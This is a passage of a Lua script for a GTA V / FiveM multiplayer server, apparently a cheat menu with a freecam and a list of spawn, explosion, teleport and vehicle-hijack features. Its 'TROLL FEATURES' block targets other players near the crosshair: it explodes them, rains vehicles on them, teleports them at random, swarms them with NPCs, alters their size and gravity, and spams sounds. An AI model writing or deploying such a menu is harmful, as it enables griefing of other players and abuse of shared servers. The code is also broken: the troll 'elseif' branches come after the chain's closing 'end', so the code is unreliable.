        FreezeEntityPosition(playerPed, false)
    end
end

-- Freecam: keep map loaded around camera
Citizen.CreateThread(function()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    while true do
        if cam_active and cam ~= nil then
            local camCoords = GetCamCoord(cam)
            -- Set focus and load collision at camera position
            SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
            RequestCollisionAtCoord(camCoords.x, camCoords.y, camCoords.z)
            -- Optionally, load surrounding map (IPL streaming)
            -- RemoveIpl("prologue") -- Example: can be used to force-load IPLs if needed
        else
            ClearFocus()
        end
        Citizen.Wait(0)
    end
end)

Citizen.CreateThread(function()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    while true do
        -- Debug: Notify when H is pressed
        if IsControlJustPressed(0, 74) then -- H key to toggle camera
            print("[MENU][4uth] Freecam toggle pressed")
            toggle_camera()
        end

        if cam_active then
            if IsControlJustPressed(0, 14) then
                if current_feature < #features then
                    current_feature = current_feature + 1
                end
            elseif IsControlJustPressed(0, 15) then
                if current_feature > 1 then
                    current_feature = current_feature - 1
                end
            end

            local coords = GetCamCoord(cam)
            local rot = GetCamRot(cam)
            local direction = RotationToDirection(rot)
            local right_vec = vector3(direction.y, -direction.x, 0.0)

            local ray_start = coords
            local ray_end = coords + direction * 1000.0
            local rayHandle = StartShapeTestRay(ray_start.x, ray_start.y, ray_start.z, ray_end.x, ray_end.y, ray_end.z, -1, PlayerPedId(), 0)
            local _, hit, end_coords, _, entity_hit = GetShapeTestResult(rayHandle)

            local horizontal_move = GetControlNormal(0, 1) * 8 -- revert to previous turn speed
            local vertical_move = GetControlNormal(0, 2) * 8
            local mouse_sensitivity = 2.0 -- revert to previous sensitivity
            local smooth_factor = 0.5 -- revert to previous smoothness
            if not _G._freecam_rot then _G._freecam_rot = {x = rot.x, y = rot.y, z = rot.z} end
            local target_x = _G._freecam_rot.x - vertical_move * mouse_sensitivity
            local target_z = _G._freecam_rot.z - horizontal_move * mouse_sensitivity
            if target_x > 89.0 then target_x = 89.0 end
            if target_x < -89.0 then target_x = -89.0 end
            _G._freecam_rot.x = _G._freecam_rot.x + (target_x - _G._freecam_rot.x) * smooth_factor
            _G._freecam_rot.z = _G._freecam_rot.z + (target_z - _G._freecam_rot.z) * smooth_factor
            SetCamRot(cam, _G._freecam_rot.x, rot.y, _G._freecam_rot.z)

            local shift = IsDisabledControlPressed(0, 21)
            local move_speed = shift and 8.0 or 2.0 -- revert to previous movement speed
            local move_vec = vector3(0.0, 0.0, 0.0)
            local up_vec = vector3(0.0, 0.0, 1.0)
            if IsDisabledControlPressed(0, 32) then move_vec = move_vec + direction end      -- W = forward
            if IsDisabledControlPressed(0, 33) then move_vec = move_vec - direction end      -- S = backward
            if IsDisabledControlPressed(0, 34) then move_vec = move_vec - right_vec end      -- A = left
            if IsDisabledControlPressed(0, 35) then move_vec = move_vec + right_vec end      -- D = right
            if IsDisabledControlPressed(0, 20) then move_vec = move_vec + up_vec end         -- Z = up
            if IsDisabledControlPressed(0, 36) then move_vec = move_vec - up_vec end         -- Left Ctrl = down
            if #(move_vec) > 0.0 then
                move_vec = move_vec / #(move_vec) * move_speed
                SetCamCoord(cam, coords.x + move_vec.x, coords.y + move_vec.y, coords.z + move_vec.z)
            end

            local centerX = 0.5 -- Center of screen
            -- Move menu just below the crosshair (center of screen, slightly down)
            local centerY = 0.58 -- Just below crosshair (crosshair is ~0.5-0.6)
            local lineHeight = 0.025 -- Compact list
            for idx = 1, #features do
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.0, 0.22)
                if idx == current_feature then
                    SetTextColour(255, 255, 255, 255)
                else
                    SetTextColour(200, 200, 200, 180)
                end
                SetTextCentre(1)
                SetTextOutline()
                SetTextEntry("STRING")
                AddTextComponentString(features[idx])
                DrawText(centerX, centerY + (idx - 1) * lineHeight)
            end

            -- === FEATURES ===
            -- ...existing code...




            if features[current_feature] == "Shoot" then
            print("[MENU][4uth] Shoot")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 0, 255)
                local weaponHash = GetHashKey("weapon_appistol")
                RequestWeaponAsset(weaponHash, 31, 0)
                local function shoot_bullet()
                    local x, y, z = table.unpack(coords + direction * 5.0)
                    ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, x, y, z, 100, true, weaponHash, -1, true, false, -1.0)
                end
                if IsDisabledControlPressed(0, 24) then
                    local now = GetGameTimer()
                    if now - lastAutoShot > 60 then
                        if HasWeaponAssetLoaded(weaponHash) then
                            shoot_bullet()
                            lastAutoShot = now
                        end
                    end
                else
                    if IsDisabledControlJustPressed(0, 24) then
                        if HasWeaponAssetLoaded(weaponHash) then
                            shoot_bullet()
                        end
                    end
                end
            elseif features[current_feature] == "Object Spawner" then
            print("[MENU][4uth] Object Spawner")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 255, 255, 255)
                if not _G._objSpawnerList then
                    -- Only use the requested model as the default
                    _G._objSpawnerList = {"prop_shuttering03"}
                    _G._objSpawnerIndex = 1
                end
                if not _G._objSpawnerModel or not IsModelInCdimage(GetHashKey(_G._objSpawnerModel)) then
                    _G._objSpawnerModel = _G._objSpawnerList[_G._objSpawnerIndex]
                end
                -- Q key input for object spawner removed as requested
                -- (R bind removed)
                if IsDisabledControlJustPressed(0, 24) then
                    local objectModel = GetHashKey(_G._objSpawnerModel)
                    RequestModel(objectModel)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(objectModel) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(objectModel) then
                        if hit == 1 then
                            local obj = CreateObject(objectModel, end_coords.x, end_coords.y, end_coords.z, true, false, true)
                            SetEntityAsMissionEntity(obj, true, true)
                            SetModelAsNoLongerNeeded(objectModel)
                        else
                            local spawnCoords = coords + direction * 10.0
                            local obj = CreateObject(objectModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, true, false, true)
                            SetEntityAsMissionEntity(obj, true, true)
                            SetModelAsNoLongerNeeded(objectModel)
                        end
                    end
                end
            elseif features[current_feature] == "Ped Spawner" then
            print("[MENU][4uth] Ped Spawner")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 0, 255)
                if not _G._pedSpawnerModel then _G._pedSpawnerModel = "a_m_m_skidrow_01" end
                -- Q key input for ped spawner removed as requested
                if IsDisabledControlJustPressed(0, 24) then
                    local pedModel = GetHashKey(_G._pedSpawnerModel)
                    RequestModel(pedModel)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(pedModel) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(pedModel) then
                        if hit == 1 then
                            local ped = CreatePed(26, pedModel, end_coords.x, end_coords.y, end_coords.z, 0.0, true, false)
                            SetEntityAsMissionEntity(ped, true, true)
                            SetModelAsNoLongerNeeded(pedModel)
                        else
                            local spawnCoords = coords + direction * 10.0
                            local ped = CreatePed(26, pedModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, 0.0, true, false)
                            SetEntityAsMissionEntity(ped, true, true)
                            SetModelAsNoLongerNeeded(pedModel)
                        end
                    end
                end
            elseif features[current_feature] == "Spikestrip Spawner" then
            print("[MENU][4uth] Spikestrip")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 255, 0, 255)
                if IsDisabledControlJustPressed(0, 24) then
                    local spikestripModel = GetHashKey("p_ld_stinger_s")
                    RequestModel(spikestripModel)
                    while not HasModelLoaded(spikestripModel) do Wait(0) end
                    local obj
                    if hit == 1 then
                        obj = CreateObject(spikestripModel, end_coords.x, end_coords.y, end_coords.z, true, false, true)
                    else
                        local spawnCoords = coords + direction * 10.0
                        obj = CreateObject(spikestripModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, true, false, true)
                    end
                    SetEntityAsMissionEntity(obj, true, true)
                    SetModelAsNoLongerNeeded(spikestripModel)
                    table.insert(spikestrips, obj)
                end
            elseif features[current_feature] == "Explode" then
            print("[MENU][4uth] Explode")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 128, 0, 255)
                if IsDisabledControlJustPressed(0, 24) then
                    local fireCoords
                    if hit == 1 then
                        fireCoords = end_coords
                    else
                        fireCoords = coords + direction * 10.0
                    end
                    AddExplosion(fireCoords.x, fireCoords.y, fireCoords.z, 6, 10.0, true, false, 1.0)
                end
            elseif features[current_feature] == "Teleport" then
            print("[MENU][4uth] Teleport")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 0, 255)
                if hit then
                    teleportMarkerCoords = end_coords
                end
                if teleportMarkerCoords ~= nil and IsDisabledControlJustPressed(0, 24) then
                    local playerPed = PlayerPedId()
                    if entity_hit ~= 0 and IsEntityAVehicle(entity_hit) then
                        local vehicle = entity_hit
                        local seat = GetEmptySeat(vehicle)
                        if seat == -1 then
                            TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                        elseif seat >= 0 then
                            TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                        end
                    else
                        if IsPedInAnyVehicle(playerPed, false) then
                            local veh = GetVehiclePedIsIn(playerPed, false)
                            SetEntityCoords(veh, teleportMarkerCoords.x, teleportMarkerCoords.y, teleportMarkerCoords.z, false, false, false, false)
                        else
                            SetEntityCoords(playerPed, teleportMarkerCoords.x, teleportMarkerCoords.y, teleportMarkerCoords.z, false, false, false, false)
                        end
                    end
                    teleportMarkerCoords = nil
                end
            elseif features[current_feature] == "Delete Entity" then
            print("[MENU][4uth] Delete")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 0, 255)
                if IsDisabledControlJustPressed(0, 24) and hit and entity_hit ~= 0 then
                    if DoesEntityExist(entity_hit) then
                        SetEntityAsMissionEntity(entity_hit, true, true)
                        DeleteEntity(entity_hit)
                    end
                end
            elseif features[current_feature] == "Vehicule Hijack" then
            print("[MENU][4uth] Vehicule Hijack")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 128, 0, 255)
                if IsDisabledControlJustPressed(0, 24) and hit and entity_hit ~= 0 and IsEntityAVehicle(entity_hit) then
                    local vehicle = entity_hit
                    if DoesEntityExist(vehicle) and IsVehicleSeatFree(vehicle, -1) then
                        local pedModel = GetHashKey("a_m_m_skater_01")
                        RequestModel(pedModel)
                        local timeout = GetGameTimer() + 5000
                        while not HasModelLoaded(pedModel) and GetGameTimer() < timeout do Wait(0) end
                        if HasModelLoaded(pedModel) then
                            local vehPos = GetEntityCoords(vehicle)
                            local vehHeading = GetEntityHeading(vehicle)
                            local hijackPed = CreatePed(26, pedModel, vehPos.x, vehPos.y, vehPos.z, vehHeading, false, true)
                            SetEntityAsMissionEntity(hijackPed, true, true)
                            SetPedIntoVehicle(hijackPed, vehicle, -1)
                            SetModelAsNoLongerNeeded(pedModel)
                            -- Make ped drive away (wander task, client-side only)
                            TaskVehicleDriveWander(hijackPed, vehicle, 25.0, 786603)
                            SetEntityAsNoLongerNeeded(hijackPed)
                            SetEntityAsNoLongerNeeded(vehicle)
                        end
                    end
                end
            elseif features[current_feature] == "Vehicle Spawner" then
            print("[MENU][4uth] Vehicle Spawner")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 255, 255)
                if not _G._vehSpawnerModel then _G._vehSpawnerModel = "t20" end
                if IsDisabledControlJustPressed(0, 24) then
                    local inputModel = _G._vehSpawnerModel
                    local vehicleModel = GetHashKey(inputModel)
                    RequestModel(vehicleModel)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(vehicleModel) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(vehicleModel) then
                        local camCoords = GetCamCoord(cam)
                        local direction = RotationToDirection(GetCamRot(cam))
                        local spawnCoords
                        if hit == 1 then
                            spawnCoords = end_coords
                        else
                            spawnCoords = camCoords + direction * 8.0
                        end
                        -- Find ground Z for spawn position
                        local found, groundZ = GetGroundZFor_3dCoord(spawnCoords.x, spawnCoords.y, spawnCoords.z + 10.0, 0)
                        if found then
                            spawnCoords = vector3(spawnCoords.x, spawnCoords.y, groundZ + 0.5)
                        end
                        -- Heading: face in camera direction
                        local heading = GetCamRot(cam).z
                        local vehicle = CreateVehicle(vehicleModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, heading, true, false)
                        SetEntityAsMissionEntity(vehicle, true, true)
                        SetVehicleOnGroundProperly(vehicle)
                        SetModelAsNoLongerNeeded(vehicleModel)
                        _G._vehSpawnerModel = inputModel
                        print("[INFO][4uth] Vehicle spawned")
                    else
                        print("[WARN][4uth] Vehicle load fail")
                    end
                end
            elseif features[current_feature] == "Shoot Vehicle" then
            print("[MENU][4uth] Shoot Vehicle")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 0, 255)
                if IsDisabledControlJustPressed(0, 24) then
                    local vehicleModel = GetHashKey("t20")
                    RequestModel(vehicleModel)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(vehicleModel) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(vehicleModel) then
                        local camCoords = GetCamCoord(cam)
                        local direction = RotationToDirection(GetCamRot(cam))
                        -- Always spawn in front of camera, even if pointing in the air
                        local spawnCoords = camCoords + direction * 8.0
                        -- No ground check: allow air spawns
                        local heading = GetCamRot(cam).z
                        local vehicle = CreateVehicle(vehicleModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, heading, true, false)
                        SetEntityAsMissionEntity(vehicle, true, true)
                        -- Apply force to the vehicle to move it towards the crosshair
                        local forceDirection = direction * 500.0
                        ApplyForceToEntity(vehicle, 1, forceDirection.x, forceDirection.y, forceDirection.z, 0, 0, 0, 0, false, true, true, false, true)
                        SetModelAsNoLongerNeeded(vehicleModel)
                        print("[INFO][4uth] Vehicle shot")
                    else
                        print("[WARN][4uth] Vehicle load fail")
                    end
                end
            elseif features[current_feature] == "Map Destroyer" then
            print("[MENU][4uth] Map Destroyer")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 255, 255)
                -- Removed display text for map destroyer ramp type
                if IsDisabledControlJustPressed(0, 24) then
                    local pos = coords + direction * 10.0
                    local objHash = GetHashKey(mapDestroyerRamps[currentRampType].model)
                    RequestModel(objHash)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(objHash) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(objHash) then
                        local ramp = CreateObject(objHash, pos.x, pos.y, pos.z, true, false, true)
                        SetEntityHeading(ramp, rot.z)
                        SetEntityAsMissionEntity(ramp, true, true)
                        FreezeEntityPosition(ramp, true)
                        SetModelAsNoLongerNeeded(objHash)
                        SetEntityCollision(ramp, true, true)
                        table.insert(placedRamps, ramp)
                    end
                end
                if IsDisabledControlJustPressed(0, 73) then
                    for _, ramp in ipairs(placedRamps) do
                        if DoesEntityExist(ramp) then
                            SetEntityAsMissionEntity(ramp, true, true)
                            DeleteEntity(ramp)
                        end
                    end
                    placedRamps = {}
                end
            end
            
            -- === TROLL FEATURES ===
        -- Launch Player feature removed as requested
        -- ...existing code...
        elseif features[current_feature] == "Attach Object" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local objName = funnyObjects[math.random(#funnyObjects)]
                    local model = GetHashKey(objName)
                    RequestModel(model)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(model) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(model) then
                        local obj = CreateObject(model, 0, 0, 0, true, false, true)
                        AttachEntityToEntity(obj, targetPed, GetPedBoneIndex(targetPed, 0x796e), 0.0, 0.0, 0.5, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        SetEntityAsMissionEntity(obj, true, true)
                        SetModelAsNoLongerNeeded(model)
                    end
                end
            end
        elseif features[current_feature] == "Explode Player" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 0, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    AddExplosion(pos.x, pos.y, pos.z, 6, 10.0, true, false, 1.0)
                end
            end
        elseif features[current_feature] == "Change Player Model" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 128, 0, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed, targetId = GetClosestPlayerToCrosshair(coords, direction)
                if targetPed and targetId then
                    local modelName = funnyModels[math.random(#funnyModels)]
                    local model = GetHashKey(modelName)
                    RequestModel(model)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(model) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(model) then
                        -- Only allow changing local player model (for safety)
                        if targetPed == PlayerPedId() then
                            SetPlayerModel(PlayerId(), model)
                            SetModelAsNoLongerNeeded(model)
                        else
                            print("[WARN][4uth] Only self")
                        end
                    end
                end
            end
        elseif features[current_feature] == "Vehicle Rain" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 128, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    for i = 1, 10 do
                        local model = GetHashKey("adder")
                        RequestModel(model)
                        local timeout = GetGameTimer() + 5000
                        while not HasModelLoaded(model) and GetGameTimer() < timeout do Wait(0) end
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, pos.x + math.random(-5,5), pos.y + math.random(-5,5), pos.z + 20 + i*2, 0.0, true, false)
                            SetEntityAsMissionEntity(veh, true, true)
                            SetModelAsNoLongerNeeded(model)
                        end
                    end
                end
            end
        elseif features[current_feature] == "Slippery Player" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    StartParticleFxLoopedAtCoord("scr_tn_trailer_sparks", pos.x, pos.y, pos.z-1, 0.0, 0.0, 0.0, 1.0, false, false, false, false)
                    SetEntityMaxSpeed(targetPed, 100.0)
                    SetPedMoveRateOverride(targetPed, 10.0)
                end
            end
        elseif features[current_feature] == "Shrink Player" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 128, 255, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    if not originalScales[targetPed] then
                        originalScales[targetPed] = GetEntityScale(targetPed)
                    end
                    SetEntityScale(targetPed, 0.5, 0.5, 0.5, false)
                end
            end
        elseif features[current_feature] == "Grow Player" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 255, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    if not originalScales[targetPed] then
                        originalScales[targetPed] = GetEntityScale(targetPed)
                    end
                    SetEntityScale(targetPed, 2.0, 2.0, 2.0, false)
                end
            end
        elseif features[current_feature] == "Random Teleport" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetRandomPosition()
                    SetEntityCoords(targetPed, pos.x, pos.y, pos.z, false, false, false, false)
                end
            end
        elseif features[current_feature] == "Sound Spam" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 255, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    local snd = funnySounds[math.random(#funnySounds)]
                    PlaySoundFromCoord(-1, snd.name, pos.x, pos.y, pos.z, snd.dict, false, 0, false)
                end
            end
        elseif features[current_feature] == "Gravity Flip" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 128, 255, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    if not gravityFlipped[targetPed] then
                        gravityFlipped[targetPed] = true
                        SetEntityGravity(targetPed, false)
                        ApplyForceToEntity(targetPed, 1, 0, 0, 1000.0, 0, 0, 0, 0, false, true, true, false, true)
                    else
                        gravityFlipped[targetPed] = nil
                        SetEntityGravity(targetPed, true)
                    end
                end
            end
        elseif features[current_feature] == "Invisible Vehicle" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 128, 128, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed and IsPedInAnyVehicle(targetPed, false) then
                    local veh = GetVehiclePedIsIn(targetPed, false)
                    SetEntityAlpha(veh, 50, false)
                end
            end
        elseif features[current_feature] == "NPC Swarm" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    for i = 1, 5 do
                        local model = GetHashKey(npcModels[math.random(#npcModels)])
                        RequestModel(model)
                        local timeout = GetGameTimer() + 5000
                        while not HasModelLoaded(model) and GetGameTimer() < timeout do Wait(0) end
                        if HasModelLoaded(model) then
                            local ped = CreatePed(26, model, pos.x + math.random(-3,3), pos.y + math.random(-3,3), pos.z, 0.0, true, false)
                            SetEntityAsMissionEntity(ped, true, true)
                            SetModelAsNoLongerNeeded(model)
                        end
                    end
                end
            end
        end

        Citizen.Wait(0)
    end
end)

-- Spikestrip effect: burst tires of vehicles driving over spikestrips
Citizen.CreateThread(function()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    while true do
        for i = #spikestrips, 1, -1 do
            local obj = spikestrips[i]
            if DoesEntityExist(obj) then
                local objCoords = GetEntityCoords(obj)
                local vehicles = GetGamePool("CVehicle")
                for _, veh in ipairs(vehicles) do
                    if DoesEntityExist(veh) and not IsEntityDead(veh) then
                        local vehCoords = GetEntityCoords(veh)
                        if #(vehCoords - objCoords) < 3.0 then -- within 3 meters
                            for tire = 0, 7 do
                                if not IsVehicleTyreBurst(veh, tire, false) then
                                    SetVehicleTyreBurst(veh, tire, true, 1000.0)
                                end
                            end
                        end
                    end
                end
            else
                table.remove(spikestrips, i)
            end
        end
        Citizen.Wait(200)
    end
end)

Citizen.CreateThread(function()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    while true do
        if cam_active then
            -- Remove FreezeEntityPosition, allow physics
            -- Block all player movement and weapon controls (mouse, keyboard, gamepad)
            DisableAllControlActions(0) -- Block all controls for player 0
            -- Allow only freecam controls (mouse look, WASD, etc. for camera)
            EnableControlAction(0, 1, true)   -- LookLeftRight (for camera)
            EnableControlAction(0, 2, true)   -- LookUpDown (for camera)
            EnableControlAction(0, 32, true)  -- W (freecam forward)
            EnableControlAction(0, 33, true)  -- S (freecam backward)
            EnableControlAction(0, 34, true)  -- A (freecam left)
            EnableControlAction(0, 35, true)  -- D (freecam right)
            EnableControlAction(0, 20, true)  -- Z (freecam up)
            EnableControlAction(0, 36, true)  -- Left Ctrl (freecam down)
            EnableControlAction(0, 14, true)  -- Scroll up (feature next)
            EnableControlAction(0, 15, true)  -- Scroll down (feature prev)
            EnableControlAction(0, 74, true)  -- H (toggle freecam)
            EnableControlAction(0, 44, true)  -- Q (input for spawners)
            EnableControlAction(0, 24, true)  -- Left Mouse (for spawn/shoot/vehicle)
            EnableControlAction(0, 69, true)  -- Mouse1 (vehicle fire)
            EnableControlAction(0, 70, true)  -- Vehicle Attack
            EnableControlAction(0, 71, true)  -- Vehicle Accelerate
            EnableControlAction(0, 72, true)  -- Vehicle Brake
            EnableControlAction(0, 75, true)  -- Vehicle Exit
            EnableControlAction(0, 76, true)  -- Vehicle Handbrake
            EnableControlAction(0, 86, true)  -- Vehicle Horn
            EnableControlAction(0, 59, true)  -- Vehicle Move Left/Right
            EnableControlAction(0, 60, true)  -- Vehicle Move Up/Down
            EnableControlAction(0, 63, true)  -- Vehicle Move Left
            EnableControlAction(0, 64, true)  -- Vehicle Move Right
            EnableControlAction(0, 65, true)  -- Vehicle Move Up
            EnableControlAction(0, 66, true)  -- Vehicle Move Down
            EnableControlAction(0, 67, true)  -- Vehicle Fly Left
            EnableControlAction(0, 68, true)  -- Vehicle Fly Right
            -- Only block weapon holding if not in a vehicle
            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                if GetSelectedPedWeapon(playerPed) ~= GetHashKey("weapon_unarmed") then
                    SetCurrentPedWeapon(playerPed, GetHashKey("weapon_unarmed"), true)
                end
            end
        end
        Citizen.Wait(0)
    end
end)





















